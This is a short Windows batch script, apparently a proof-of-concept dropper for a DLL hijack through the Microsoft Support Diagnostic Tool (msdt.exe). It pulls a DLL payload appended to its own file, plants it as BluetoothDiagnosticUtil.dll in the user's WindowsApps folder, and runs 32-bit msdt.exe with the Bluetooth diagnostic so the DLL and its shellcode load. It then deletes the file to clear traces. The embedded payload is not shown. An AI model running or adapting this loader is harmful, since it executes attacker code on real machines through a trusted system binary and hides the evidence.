;;;;;,,,,,;;;;@echo Off
;;;;;,,,,,;;;;REM Extract all data not starting by ;;;;;,,,,,;;;; from current file to drop the DLL
;;;;;,,,,,;;;;findstr /v "^;;;;;,,,,,;;;;" "%~f0" > %appdata%\..\Local\Microsoft\WindowsApps\BluetoothDiagnosticUtil.dll
;;;;;,,,,,;;;;REM Start 32bit msdt.exe in background
;;;;;,,,,,;;;;start /b c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes
;;;;;,,,,,;;;;REM Wait 8 seconds, meanwhile the malicious DLL is loaded and the shellcode kills msdt and sdiagnhost
;;;;;,,,,,;;;;timeout 8 /nobreak 
;;;;;,,,,,;;;;REM cleanup
;;;;;,,,,,;;;;del %appdata%\..\Local\Microsoft\WindowsApps\BluetoothDiagnosticUtil.dll
